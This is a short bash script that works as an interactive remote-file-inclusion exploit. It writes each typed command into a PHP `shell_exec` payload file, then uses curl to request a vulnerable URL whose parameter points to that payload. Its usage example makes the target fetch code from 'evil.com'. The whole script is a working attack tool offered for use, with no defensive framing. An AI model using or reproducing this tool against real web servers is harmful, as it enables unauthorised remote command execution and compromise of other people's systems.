#!/bin/bash

function rfi_template {
	echo "<?php print shell_exec(\"${1}\");?>" > ${2}
}

function usage {
	echo "usage: $0 [-f cmd.txt] -u URL"
	echo "eg   : $0 -f /var/www/hack.txt  -u \"http://vulnsite.com/test.php?page=http://evil.com/cmd.txt\""
}

if [[ -z $1 ]]; then 
	usage
	exit 0;
fi

prefix=""
suffix=""
url=""
cmdfile=""
rfifile=""

while getopts "u:f:" OPT; do 
	case $OPT in
		u) url=$OPTARG;;
		f) rfifile=$OPTARG;;
		*) usage; exit 0;;
	esac
done

if [[ -z $url ]]; then
	usage
	exit 0;
fi

which curl &>/dev/null
if [[ $? -ne 0 ]]; then
	echo "[!] curl needs to be installed to run this script"
	exit 1
fi

if [[ ! -z $rfifile ]]; then 
	# use RFI to execute commands
	while :; do 
		printf "[rfi>] "
		read cmd
		rfi_template "${cmd}" ${rfifile}
		echo "[+] requesting ${url}${prefix}${suffix}"
		curl "${url}${prefix}${suffix}"
		echo ""
	done
fi

